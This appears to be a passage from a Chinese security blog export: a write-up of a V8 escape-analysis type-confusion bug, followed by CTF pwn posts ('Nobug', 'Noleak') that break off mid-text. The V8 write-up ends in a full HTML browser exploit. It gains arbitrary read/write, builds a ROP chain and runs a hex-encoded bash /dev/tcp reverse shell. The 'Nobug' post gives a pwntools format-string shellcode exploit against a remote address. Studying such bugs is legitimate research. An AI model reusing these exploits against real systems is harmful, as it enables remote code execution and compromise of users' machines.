n)的时间。checkmap决定了这个节点生成的JIT该以什么方式去操作对象。如果checkmap缺失，将导致生成的JIT代码有问题，发生类型混淆。\n0x02 漏洞分析patch分析diff --git a/src/compiler/escape-analysis.cc b/src/compiler/escape-analysis.ccindex 2a096b6933..3046d7b04e 100644--- a/src/compiler/escape-analysis.cc+++ b/src/compiler/escape-analysis.cc@@ -178,7 +178,7 @@ class EscapeAnalysisTracker : public ZoneObject &#123;         : VariableTracker::Scope(&amp;tracker-&gt;variable_states_, node, reduction),           tracker_(tracker),           reducer_(reducer) &#123;&#125;-    const VirtualObject* GetVirtualObject(Node* node) &#123;+    VirtualObject* GetVirtualObject(Node* node) &#123;       VirtualObject* vobject = tracker_-&gt;virtual_objects_.Get(node);       if (vobject) vobject-&gt;AddDependency(current_node());       return vobject;@@ -576,10 +576,14 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,     case IrOpcode::kStoreField: &#123;       Node* object = current-&gt;ValueInput(0);       Node* value = current-&gt;ValueInput(1);-      const VirtualObject* vobject = current-&gt;GetVirtualObject(object);+      VirtualObject* vobject = current-&gt;GetVirtualObject(object);       Variable var;       if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;           vobject-&gt;FieldAt(OffsetOfFieldAccess(op)).To(&amp;var)) &#123;+        // Attach cached map info to the virtual object.+        if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) &#123;+          vobject-&gt;SetMap(value);+        &#125;         current-&gt;Set(var, value);         current-&gt;MarkForDeletion();       &#125; else &#123;@@ -747,6 +751,17 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,           // yet.           break;         &#125;+      &#125; else if (vobject) &#123;+        Node* cache_map = vobject-&gt;Map();+        if (cache_map) &#123;+          Type const map_type = NodeProperties::GetType(cache_map);+          if (map_type.IsHeapConstant() &amp;&amp;+              params.maps().contains(+                  map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;+            current-&gt;MarkForDeletion();+            break;+          &#125;+        &#125;       &#125;       current-&gt;SetEscaped(checked);       break;@@ -804,6 +819,12 @@ void ReduceNode(const Operator* op, EscapeAnalysisTracker::Scope* current,       for (int i = 0; i &lt; value_input_count; ++i) &#123;         Node* input = current-&gt;ValueInput(i);         current-&gt;SetEscaped(input);++        // Invalidate associated map cache for all value input nodes.+        VirtualObject* vobject = current-&gt;GetVirtualObject(input);+        if (vobject) &#123;+          vobject-&gt;SetMap(nullptr);+        &#125;       &#125;       if (OperatorProperties::HasContextInput(op)) &#123;         current-&gt;SetEscaped(current-&gt;ContextInput());diff --git a/src/compiler/escape-analysis.h b/src/compiler/escape-analysis.hindex 0fbc7d0bdd..ec56488388 100644--- a/src/compiler/escape-analysis.h+++ b/src/compiler/escape-analysis.h@@ -147,11 +147,14 @@ class VirtualObject : public Dependable &#123;   bool HasEscaped() const &#123; return escaped_; &#125;   const_iterator begin() const &#123; return fields_.begin(); &#125;   const_iterator end() const &#123; return fields_.end(); &#125;+  Node* Map() const &#123; return map_; &#125;+  void SetMap(Node* map) &#123; map_ = map; &#125;   private:   bool escaped_ = false;   Id id_;   ZoneVector&lt;Variable&gt; fields_;+  Node* map_; &#125;;  class EscapeAnalysisResult &#123;\n从中可用看出，patch文件在 VirtualObject类中增加了几个变量和函数，并在一些位置进行调用，利用git apply patch.diff将patch文件应用，然后我们分析完整的escape-analysis.cc文件，在ReduceNode函数中的IrOpcode::kStoreField分支时\n case IrOpcode::kStoreField: &#123;   Node* object = current-&gt;ValueInput(0);   Node* value = current-&gt;ValueInput(1);   VirtualObject* vobject = current-&gt;GetVirtualObject(object);   Variable var;//如果对象没有逃逸   if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;       vobject-&gt;FieldAt(OffsetOfFieldAccess(op)).To(&amp;var)) &#123;     // Attach cached map info to the virtual object.     if (OffsetOfFieldAccess(op) == HeapObject::kMapOffset) &#123;       vobject-&gt;SetMap(value); //拷贝一份map值     &#125;     current-&gt;Set(var, value); //将对象里面保存的值赋给一个变量     current-&gt;MarkForDeletion(); //标记法将该节点删除   &#125; else &#123;     current-&gt;SetEscaped(object);     current-&gt;SetEscaped(value);   &#125;   break; &#125;\n上面的代码可以体现出逃逸分析中的变量替换思想，即对没有逃逸的对象进行优化。接下来继续看IrOpcode::kCheckMaps分支补丁上去的代码\ncase IrOpcode::kCheckMaps: &#123;  CheckMapsParameters params = CheckMapsParametersOf(op);  Node* checked = current-&gt;ValueInput(0);  const VirtualObject* vobject = current-&gt;GetVirtualObject(checked);  Variable map_field;  Node* map;  if (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;      vobject-&gt;FieldAt(HeapObject::kMapOffset).To(&amp;map_field) &amp;&amp;      current-&gt;Get(map_field).To(&amp;map)) &#123; //未逃逸    if (map) &#123;      Type const map_type = NodeProperties::GetType(map);      if (map_type.IsHeapConstant() &amp;&amp;          params.maps().contains(              map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;        current-&gt;MarkForDeletion();        break;      &#125;    &#125; else &#123;      // If the variable has no value, we have not reached the fixed-point      // yet.      break;    &#125;   //这里是patch上的代码  &#125; else if (vobject) &#123; //逃逸状态    Node* cache_map = vobject-&gt;Map();    if (cache_map) &#123; //如果该对象存在map的副本      Type const map_type = NodeProperties::GetType(cache_map);      if (map_type.IsHeapConstant() &amp;&amp;          params.maps().contains(              map_type.AsHeapConstant()-&gt;Ref().AsMap().object())) &#123;        current-&gt;MarkForDeletion(); //将这个checkmap标记为删除状态        break;      &#125;    &#125;  &#125;  current-&gt;SetEscaped(checked);  break;&#125;\n前面我们介绍过，所有节点的checkmap保存在一棵树上，因此为了方便进行删除，这里用的是MarkForDeletion()，只需要O(1)的时间即可将当前这个节点的checkmap标记为删除。checkmap被删除的话，那么JIT在处理这个节点时将无法知道其当前的类型，由此会造成类型混淆(Type Confusion)。再来看打到default分支上的补丁\ndefault: &#123;  // For unknown nodes, treat all value inputs as escaping.  int value_input_count = op-&gt;ValueInputCount();  for (int i = 0; i &lt; value_input_count; ++i) &#123;    Node* input = current-&gt;ValueInput(i);    current-&gt;SetEscaped(input);    // 将该节点的map_设置为null    VirtualObject* vobject = current-&gt;GetVirtualObject(input);    if (vobject) &#123;      vobject-&gt;SetMap(nullptr);    &#125;  &#125;  if (OperatorProperties::HasContextInput(op)) &#123;    current-&gt;SetEscaped(current-&gt;ContextInput());  &#125;  break;&#125;\n可以看出这里又清除了map_变量的值\nPOC构造与分析首先得让vobject-&gt;_map这个变量被赋值，那么就是发生在没有逃逸的时候，会进入分支\nif (vobject &amp;&amp; !vobject-&gt;HasEscaped() &amp;&amp;          vobject-&gt;FieldAt(OffsetOfFieldAccess(op)).To(&amp;var)) &#123;\n然后得让变量进入逃逸状态，这样当进入case IrOpcode::kCheckMaps:时能够进入else if (vobject) &#123; //逃逸状态&#125;分支，但要执行到current-&gt;MarkForDeletion();语句，还得保证Node* cache_map = vobject-&gt;Map();不为空。首先构造如下的代码\nfunction opt(foo) &#123;   var a = [1.1]; //未逃逸   foo(a); //逃逸   return a[0];&#125;//触发JIT编译for (var i=0;i&lt;0x20000;i++) &#123;   opt((o)=&gt;&#123;&#125;);&#125;x = Array(0);print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型\n运行后发现不能像我们预期的那样发生类型混淆，通过gdb调试看一下，在三个patch点下断点\nb escape-analysis.cc:585b escape-analysis.cc:738b escape-analysis.cc:826\n通过调试发现仅能在585这一个分支断下，添加-print-opt-code选项可以看到整个代码都被JIT优化了这样的话JIT编译器可以确定foo做了什么，我们的opt函数就会退化为\nfunction opt(foo) &#123;   var a = [1.1];    return a[0];&#125;\n因此我们得仅让opt这一个函数被优化，由此应该这样\nfunction opt(foo) &#123;   //触发JIT编译   for (var i=0;i&lt;0x20000;i++) &#123;   &#125;   var a = [1.1]; //未逃逸   foo(a); //逃逸   return a[0];&#125;opt((o)=&gt;&#123;&#125;);x = Array(0);print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型\n这样运行，会发现opt的JIT生成了两次，也就是说print(opt((o)=&gt;&#123;o[0] = x;&#125;)); 这句的opt调用并没有匹配到之前opt生成的JIT代码，查看第一次生成的JIT代码（关键部分）\n0x131a00084fa9    e9  49ba009784e7ad7f0000 REX.W movq r10,0x7fade7849700  (CreateShallowArrayLiteral)    ;; off heap target0x131a00084fb3    f3  41ffd2         call r100x131a00084fb6    f6  49c7c504000000 REX.W movq r13,0x40x131a00084fbd    fd  e87ef00b00     call 0x131a00144040     ;; deopt-soft deoptimization bailout\n查看第二次JIT生成的关键代码\n   f8  488945b8       REX.W movq [rbp-0x48],rax0x131a000851dc    fc  4c8b4518       REX.W movq r8,[rbp+0x18]0x131a000851e0   100  48bf6d8c14081a130000 REX.W movq rdi,0x131a08148c6d    ;; object: 0x131a08148c6d &lt;JSFunction (sfi = 0x131a082d269d)&gt;0x131a000851ea   10a  443bc7         cmpl r8,rdi0x131a000851ed   10d  0f85db010000   jnz 0x131a000853ce  &lt;+0x2ee&gt;\n可以看出，第一次并没有匹配参数，而是直接 deopt-soft deoptimization bailout，而第二次有匹配参数，判断函数地址是否为指定值，因此，我们再增加几个opt调用看看有什么变化。\nfunction opt(foo) &#123;   //触发JIT编译   for (var i=0;i&lt;0x20000;i++) &#123;   &#125;   var a = [1.1]; //未逃逸   foo(a); //逃逸   return a[0];&#125;opt((o)=&gt;&#123;&#125;);opt((o)=&gt;&#123;&#125;);opt((o)=&gt;&#123;&#125;);x = Array(0);print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型\n我们看到，最后一个标号为2，也就是总共生成了opt函数的3份JIT代码，而我们的js里有4个opt函数调用，也就是说，最后的print(opt((o)=&gt;&#123;o[0] = x;&#125;));成功匹配了JIT代码。我们查看最后一份的JIT代码\n0x2a000854c0     0  488d1df9ffffff REX.W leaq rbx,[rip+0xfffffff9]0x2a000854c7     7  483bd9         REX.W cmpq rbx,rcx0x2a000854ca     a  7418           jz 0x2a000854e4  &lt;+0x24&gt;0x2a000854cc     c  48ba6a00000000000000 REX.W movq rdx,0x6a0x2a000854d6    16  49ba20371523787f0000 REX.W movq r10,0x7f7823153720  (Abort)    ;; off heap target0x2a000854e0    20  41ffd2         call r100x2a000854e3    23  cc             int3l0x2a000854e4    24  8b59d0         movl rbx,[rcx-0x30]0x2a000854e7    27  4903dd         REX.W addq rbx,r130x2a000854ea    2a  f6430701       testb [rbx+0x7],0x10x2a000854ee    2e  740d           jz 0x2a000854fd  &lt;+0x3d&gt;0x2a000854f0    30  49ba20600523787f0000 REX.W movq r10,0x7f7823056020  (CompileLazyDeoptimizedCode)    ;; off heap target0x2a000854fa    3a  41ffe2         jmp r100x2a000854fd    3d  55             push rbp0x2a000854fe    3e  4889e5         REX.W movq rbp,rsp0x2a00085501    41  56             push rsi0x2a00085502    42  57             push rdi0x2a00085503    43  50             push rax0x2a00085504    44  4883ec10       REX.W subq rsp,0x100x2a00085508    48  488975e0       REX.W movq [rbp-0x20],rsi0x2a0008550c    4c  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))0x2a00085510    50  0f86c5010000   jna 0x2a000856db  &lt;+0x21b&gt;0x2a00085516    56  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))0x2a0008551a    5a  0f86f4010000   jna 0x2a00085714  &lt;+0x254&gt;0x2a00085520    60  b901000000     movl rcx,0x10x2a00085525    65  660f1f840000000000 nop0x2a0008552e    6e  6690           nop0x2a00085530    70  81f900000200   cmpl rcx,0x200000x2a00085536    76  0f8332000000   jnc 0x2a0008556e  &lt;+0xae&gt;0x2a0008553c    7c  83c101         addl rcx,0x10x2a0008553f    7f  49ba0000000001000000 REX.W movq r10,0x1000000000x2a00085549    89  4c3bd1         REX.W cmpq r10,rcx0x2a0008554c    8c  7715           ja 0x2a00085563  &lt;+0xa3&gt;0x2a0008554e    8e  48ba0200000000000000 REX.W movq rdx,0x20x2a00085558    98  4c8b1579ffffff REX.W movq r10,[rip+0xffffff79]0x2a0008555f    9f  41ffd2         call r100x2a00085562    a2  cc             int3l0x2a00085563    a3  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))0x2a00085567    a7  77c7           ja 0x2a00085530  &lt;+0x70&gt;0x2a00085569    a9  e9cb010000     jmp 0x2a00085739  &lt;+0x279&gt;0x2a0008556e    ae  48b9f8c6112c25560000 REX.W movq rcx,0x56252c11c6f8    ;; external reference (Heap::NewSpaceAllocationTopAddress())0x2a00085578    b8  4c8b01         REX.W movq r8,[rcx]0x2a0008557b    bb  4d8d4820       REX.W leaq r9,[r8+0x20]0x2a0008557f    bf  49bb00c7112c25560000 REX.W movq r11,0x56252c11c700    ;; external reference (Heap::NewSpaceAllocationLimitAddress()).................................................................\n可以看到，最后一份JIT代码中，已经不再对参数进行匹配了，也就是说，即使我们记下来继续调用opt()，参数无论为什么，都会匹配到，我们测试一下\nfunction opt(foo) &#123;   //触发JIT编译   for (var i=0;i&lt;0x20000;i++) &#123;   &#125;   var a = [1.1]; //未逃逸   foo(a); //逃逸   return a[0];&#125;opt((o)=&gt;&#123;&#125;);opt((o)=&gt;&#123;&#125;);opt((o)=&gt;&#123;&#125;);x = Array(0);//print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型opt(1);opt(&#123;&#125;);\n可以看到也只生成了3份JIT代码，最后两句的调用都直接走opt的JIT成功了。于是，我们的代码可以用for循环来精简一下\nfunction opt(foo) &#123;   //触发JIT编译   for (var i=0;i&lt;0x20000;i++) &#123;   &#125;   var a = [1.1]; //未逃逸   foo(a); //逃逸   return a[0];&#125;//生成多个JIT模板for (var i=0;i&lt;0x10;i++) &#123;   opt((o)=&gt;&#123;&#125;);&#125;x = Array(0);print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型\n运行后，发现仍然不能发生类型混淆，继续调试先是 (v8::internal::compiler::VirtualObject *) 0x5643165e5410设置了map_值然后(v8::internal::compiler::VirtualObject *) 0x5643165e5770设置了map_值接下来发现(v8::internal::compiler::VirtualObject *) 0x5643165e5770的map_值被清空接下来到这里，这个分支是当检测到对象逃逸时才会到达，由于前一步把这个vobject的map_给清空了，导致条件不成立，无法执行到current-&gt;MarkForDeletion();上述POC失败的原因是因为在case IrOpcode::kCheckMaps:之前先进入了default把map_值给清空了，我们可以再对象里再裹一层对象试试。\nfunction opt(foo) &#123;   //触发JIT编译   for (var i=0;i&lt;0x20000;i++) &#123;   &#125;   var a = [1.1]; //未逃逸   var b = [a]; //未逃逸   foo(b); //逃逸   return a[0];&#125;//生成多个JIT模板for (var i=0;i&lt;0x10;i++) &#123;   opt((o)=&gt;&#123;&#125;);&#125;x = Array(0);print(opt((o)=&gt;&#123;o[0][0] = x;&#125;)); //在外部函数里改变类型\n接下来我们重新调试，我们发现(const v8::internal::compiler::VirtualObject *) 0x558f95f216c0这个节点的checkmaps被删除了，因此将造成类型混淆继续运行，发现输出了对象的地址，发生了类型混淆\npwndbg&gt; p vobject$16 = (const v8::internal::compiler::VirtualObject *) 0x558f95f216c0pwndbg&gt; cContinuing.4.765298071534956e-270[Thread 0x7f202c139700 (LWP 2742) exited][Thread 0x7f202c93a700 (LWP 2741) exited][Thread 0x7f202d13b700 (LWP 2740) exited][Inferior 1 (process 2739) exited normally]pwndbg&gt; \n如下是有漏洞的JIT代码\n0x2343000857c8   1a8  488b7d18       REX.W movq rdi,[rbp+0x18]0x2343000857cc   1ac  b801000000     movl rax,0x10x2343000857d1   1b1  49bae0bfb6d9a77f0000 REX.W movq r10,0x7fa7d9b6bfe0  (Call_ReceiverIsNullOrUndefined)    ;; off heap target0x2343000857db   1bb  41ffd2         call r10 ;调用外部函数0x2343000857de   1be  488b4dd8       REX.W movq rcx,[rbp-0x28]0x2343000857e2   1c2  448b4107       movl r8,[rcx+0x7] ;以DOUBLE_ELEMENTS的方式取数据0x2343000857e6   1c6  4d03c5         REX.W addq r8,r130x2343000857e9   1c9  448b490b       movl r9,[rcx+0xb]0x2343000857ed   1cd  41d1f9         sarl r9, 10x2343000857f0   1d0  4183f900       cmpl r9,0x00x2343000857f4   1d4  0f869a010000   jna 0x234300085994  &lt;+0x374&gt;0x2343000857fa   1da  c4c17b104007   vmovsd xmm0,[r8+0x7]0x234300085800   1e0  c5fb2cc8       vcvttsd2si rcx,xmm00x234300085804   1e4  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx0x234300085808   1e8  c5f92ec8       vucomisd xmm1,xmm00x23430008580c   1ec  0f8a39000000   jpe 0x23430008584b  &lt;+0x22b&gt;0x234300085812   1f2  0f8533000000   jnz 0x23430008584b  &lt;+0x22b&gt;0x234300085818   1f8  83f900         cmpl rcx,0x00x23430008581b   1fb  0f8428010000   jz 0x234300085949  &lt;+0x329&gt;\n如下是无漏洞的JIT代码\n0x286d000857b0   1b0  49ba405e010f7e7f0000 REX.W movq r10,0x7f7e0f015e40  (Call_ReceiverIsNullOrUndefined)    ;; off heap target0x286d000857ba   1ba  41ffd2         call r100x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r80x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  &lt;+0x36f&gt;0x286d000857d1   1d1  448b4107       movl r8,[rcx+0x7]0x286d000857d5   1d5  4d03c5         REX.W addq r8,r130x286d000857d8   1d8  448b490b       movl r9,[rcx+0xb]0x286d000857dc   1dc  41d1f9         sarl r9, 10x286d000857df   1df  4183f900       cmpl r9,0x00x286d000857e3   1e3  0f8692010000   jna 0x286d0008597b  &lt;+0x37b&gt;0x286d000857e9   1e9  c4c17b104007   vmovsd xmm0,[r8+0x7]0x286d000857ef   1ef  c5fb2cc8       vcvttsd2si rcx,xmm00x286d000857f3   1f3  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx0x286d000857f7   1f7  c5f92ec8       vucomisd xmm1,xmm00x286d000857fb   1fb  0f8a25000000   jpe 0x286d00085826  &lt;+0x226&gt;0x286d00085801   201  0f851f000000   jnz 0x286d00085826  &lt;+0x226&gt;0x286d00085807   207  83f900         cmpl rcx,0x00x286d0008580a   20a  0f8414010000   jz 0x286d00085924  &lt;+0x324&gt;\n可以发现，由于逃逸分析时把checkmaps删除了，使得生成的JIT代码里调用完函数后少了如下的检查代码，由此发生类型混淆\n0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r80x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  &lt;+0x36f&gt;\n0x03 漏洞利用利用类型混淆，构造addressOf和fakeObj原语，然后利用两个原语伪造一个ArrayBuffer，实现任意地址读写。然后可以创建一个div对象，利用任意地址读写篡改其虚表，然后执行对应的操作劫持程序流\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;var buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;function u32f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(0,true);&#125;function i2f(value) &#123;   dv.setUint32(0,value,true);   return dv.getFloat32(0,true);&#125;//function opt0(o) &#123;   for(var i = 0; i &lt; 200000; i++) &#123; &#125;   let a = [1.1,2.2,3.3,4.4];   let b = [a];   o(b);   return a[0];&#125;for (var i=0;i&lt;10;i++) &#123;   opt0((o)=&gt;&#123;&#125;);&#125;var spary_size = 0x201;var spary = new Array(spary_size);for (var i=0;i&lt;spary_size;i+=3) &#123;   spary[i] = new Array(1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12,13.13,14.14,15.15);   spary[i+1] = new ArrayBuffer(0x2000);   spary[i+2] = new Float64Array(0x5);&#125;function addressOf(obj) &#123;   var addr = opt0((o)=&gt;&#123;o[0][0] = obj;&#125;);   return u32f(addr) - 1;&#125;function fakeObject(addr) &#123;   var fval = i2f64(addr + 1);   let f = eval(`(x,y,val)=&gt;&#123;     for(var i = 0; i &lt; 200000; i++) &#123; &#125;     let a = [1.1,2.2,3.3,4.4];     let b = [a];     x(b);     a[0] = val;     return y(b);   &#125;`);   for (var i=0;i&lt;10;i++) &#123;      f((o)=&gt;&#123;&#125;,(o)=&gt;&#123;&#125;,fval);   &#125;   return f((o)=&gt;&#123;o[0][0] = &#123;&#125;;&#125;,(o)=&gt;&#123;return o[0][0];&#125;,fval);&#125;let arr = spary[spary_size-0x3];let arr_address = addressOf(arr);let proto_addr = addressOf(Array.prototype);//fake a FixedDoubleArray Maparr[0] = p64f(0x08042115,0x18040404);arr[1] = p64f(0x29000423,0x0a0007ff);arr[2] = p64f(proto_addr+1,0);//alert(arr_address.toString(16));let element_addr = arr_address + 0x14;let fake_element = element_addr+0x44;//fake a FixedDoubleArrayarr[4] = p64f(0,element_addr+0x8+0x1);arr[5] = p64f(0x08042229,fake_element+1);arr[6] = p64f(0x7ffffffe,0);//fake a FixedDoubleArray&#x27;s elementarr[7] = p64f(0,0x08042ab1);arr[8] = p64f(0x7ffffffe,0);var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);//leak backing storebacking_store_addr = u64f(arb_fixeddouble_arr[0x9]);heap_t_addr = u64f(arb_fixeddouble_arr[0xa])//alert(backing_store_addr.toString(16));//alert(heap_t_addr.toString(16));//leak compression ptr high bytecompression_high_bytes = u32f(arb_fixeddouble_arr[0x20]);//alert(compression_high_bytes.toString(16));function addressOf_full(obj) &#123;   var addr = addressOf(obj);   return (BigInt(compression_high_bytes) &lt;&lt; 32n) + BigInt(addr);&#125;arr = spary[spary_size-0x6];arr_address = addressOf(arr);proto_addr = addressOf(ArrayBuffer.prototype);//fake a ArrayBuffer Maparr[0] = p64f(0x08042115,0x140e0e0e);arr[1] = p64f(0x19000424,0x084003ff);arr[2] = p64f(proto_addr+1,0);element_addr = arr_address + 0x14;fake_element = element_addr+0x44;//fake a ArrayBufferarr[4] = p64f(0,element_addr+0x8+0x1);arr[5] = p64f(0x08042229,0x08042229);arr[6] = p64f(0xffffffff,0);arr[7] = p64f(0,0);arr[9] = p64f(0,2);var arb_arraybuffer = fakeObject(element_addr + 0x2c);var adv = new DataView(arb_arraybuffer);function read64(addr) &#123;   arr[7] = i2f64(addr);   return adv.getBigUint64(0,true);&#125;function write64(addr,value) &#123;   arr[7] = i2f64(addr);   adv.setBigUint64(0,BigInt(value),true);&#125;var tmp = read64(heap_t_addr + 0x10n);var elf_base = read64(tmp) - 0xa76f5c0n;xchg_rax_rsp = elf_base + 0x872BD7En;pop_rdi = elf_base + 0xA63BE3Bn;libc_start_main_got = elf_base + 0x000000000ACA7348n;var libc_base = read64(libc_start_main_got) - 0x21ab0n;var system_addr = libc_base + 0x4f4e0n;//alert(&quot;libc_base=&quot; + libc_base.toString(16));//let div = document.createElement(&quot;div&quot;);let div_addr = addressOf_full(div);let divobj_addr = read64(div_addr + 20n);//rop chainwrite64(backing_store_addr+0x1000n+0x50n,xchg_rax_rsp);write64(backing_store_addr+0x1000n,pop_rdi);write64(backing_store_addr+0x1000n+0x8n,backing_store_addr+0x1000n+0x100n);write64(backing_store_addr+0x1000n+0x10n,system_addr);//cmdwrite64(backing_store_addr+0x1000n+0x100n,0x7361622F6E69622Fn);write64(backing_store_addr+0x1000n+0x108n,0x20263E20692D2068n);write64(backing_store_addr+0x1000n+0x110n,0x7063742F7665642Fn);write64(backing_store_addr+0x1000n+0x118n,0x302E302E3732312Fn);write64(backing_store_addr+0x1000n+0x120n,0x20363636362F312En);write64(backing_store_addr+0x1000n+0x128n,0x31263E30n);//fake vtable ptrwrite64(divobj_addr,backing_store_addr+0x1000n);//alert(&quot;div_addr=&quot;+div_addr.toString(16));div.dispatchEvent(new Event(&#x27;click&#x27;));    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n0x04 感想在写这篇文章的过程中，某些疑难点无形中理解了，以后得坚持写文章记录过程。\n0x05 参考JVM之逃逸分析深入理解Java中的逃逸分析[JVM] 逃逸分析(Escape Analysis）Escape Analysis in V8Pwn2Win OmniTmizer\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"Nobug","url":"/2019/12/20/NoBug/","content":"首先，检查一下程序的保护机制\n\n\nPIE和NX没开，那么，我们可以轻松的布置shellcode到栈里或bss段或堆里，然后跳转。免去了泄露libc地址这些。\n然后，我们用IDA分析一下\n\n\n看似好像这里sprintf不存在漏洞，我们再看看其他函数\n\n\n看见一个很复杂的函数，我们看看那个地址处是什么\n\n\n是查表法，看起来像某种加密或解密算法，又由于不需要秘钥，我们推测可能是base64加密或解密，然后，我们测试一下。\n\n\n我们输入明文，输出总是乱码，我们输入base64字符串，发现正常输出了解密后的内容，由此，我们知道了，这个函数的作用是解密base64字符串。\n然后，我们继续找找，也没发现什么可疑的地方。再看看其他没有用到的函数\n\n\n发现这里有一个格式化字符串漏洞的函数，[但是似乎这个函数没有被调用，真的是这样吗？]{.mark}\n对于sub_8048B76函数，IDA查看伪代码是这样的\n\n\n我们再看看汇编代码\n\n\n[程序结尾，通过修改esp，决定了retn的返回地址，这类似于ROP技术的思想，由此看来，分析程序不能完全依靠IDA的为代码]{.mark}\n分析完了，其实就是存在一个**[非栈上的格式化字符串漏洞。]{.mark}**\n\n\n[我们通过%4$hhn来修改%12$处的数据为%13$的地址，然后通过%12$hhn来修改%13$处为shellcode的地址，然后就能getshell了。我们只需要覆盖低2字节就行了，因为前面是一样的。需要注意的是，这几个操作必须在一次完成。]{.mark}\n我们需要泄露%4$处的数据，以计算出我们需要攻击的目标%13$的地址\npayload = base64.b64encode(&#x27;%4$p&#x27;)  sh.sendline(payload)  sh.recvuntil(&#x27;0x&#x27;)  #泄露我们需要修改的目标的地址  target_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) + 4  \n\n接下来，就是一次性的修改，getshell。\n综上,我们的exp脚本\n#coding:utf8  from pwn import *  import base64    sh = remote(&#x27;111.198.29.45&#x27;,31218)  #sh = process(&#x27;./pwnh40&#x27;)  elf = ELF(&#x27;./pwnh40&#x27;)  #我们输入的shellcode解密后会被保存到这里  shellcode_addr = 0x804A0A0  #shellcode  shellcode = asm(shellcraft.i386.sh())    payload = base64.b64encode(&#x27;%4$p&#x27;)  sh.sendline(payload)  sh.recvuntil(&#x27;0x&#x27;)  #泄露我们需要修改的目标的地址  target_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) + 4  print hex(target_addr)  #发送shellcode，同时,覆盖%12$处为target地址，同时将target处修改为shellcode_addr  payload = base64.b64encode(shellcode + &#x27;%&#x27; + str((target_addr &amp; 0xFF) - len(shellcode)) + &#x27;c%4$hhn%&#x27; + str((shellcode_addr &amp; 0xFF) - (target_addr &amp; 0xFF)) + &#x27;c%12$hn&#x27;)  #getshell  sh.sendline(payload)    sh.interactive()  \n\n本题告诉我们，[分析程序时，不要完全依赖IDA的伪代码]{.mark}。同时，对于一些复杂的算法，可以推测并尝试一下，说不定就是呢。\n","categories":["CTF"],"tags":["ROP","IDA代码隐藏"]},{"title":"Noleak","url":"/2019/11/13/Noleak/","content":"首先，介绍一下malloc_hook，这是C语言提供的一个用来包装malloc的，类似还有free_hook，具体可以查阅相关资料学习\nMalloc hook我们看如下代码\n#include &lt;stdio.h&gt;  #include &lt;malloc.h&gt;    void *fun() &#123;     __malloc_hook = NULL;     printf(&quot;hello,fun was called!\\n&quot;);     return NULL;  &#125;  int main() &#123;     __malloc_hook = fun;     malloc(10);  &#125;  \n\n只要我们把 __malloc_hook赋值为某个函数的地址，那么，当我们malloc时，系统就会去调用那个函数。\nUnsorted bin unlinkUnsorted bin使用双向链表维护，假如在物理地址上，chunk0后面是chunk1，我们通过chunk0溢出到chunk1，并且还在chunk0里面伪造了一个chunk，其中fd和bk指向了我们的目标附近处，溢出修改chunk1的prev_size和size，让假的chunk伪装成free的状态，这样，当我们释放chunk1时就触发了unlink，使得chunk0的指针指向了我们的目标处，接下来，我们编辑chunk0，就是编辑目标处。关于unlink的详细知识，请看我之前的一篇博客https://blog.csdn.net/seaaseesa/article/details/102907138 。\n本题，当我们free一个unsorted bin时，它的fd指针会指向libc中main_arena+88地址处，而该处的上方不远处，就是__malloc_hook\n我们先创建一个256字节的堆，然后释放它，释放后的堆块数据结构是这样的，fd和bk设置成了main_arena+88的值\n\n\n__malloc_hook\n\n\nmain_arena+88处\n\n\n我们的目的是修改__malloc_hook，让它指向指向我们的shellcode地址，这样，当我们malloc时，就会触发我们的shellcode执行。\nfastbin 